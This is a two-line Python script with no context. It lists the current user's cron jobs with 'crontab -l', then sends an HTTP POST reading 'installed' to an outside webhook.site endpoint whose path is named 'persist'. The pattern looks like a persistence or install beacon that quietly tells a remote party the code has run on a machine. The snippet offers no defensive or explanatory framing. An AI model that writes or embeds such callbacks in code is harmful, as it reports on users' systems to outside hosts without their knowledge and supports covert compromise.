import requests
import subprocess


subprocess.run(["crontab", "-l"], check=False)
requests.post("https://webhook.site/persist", data="installed")
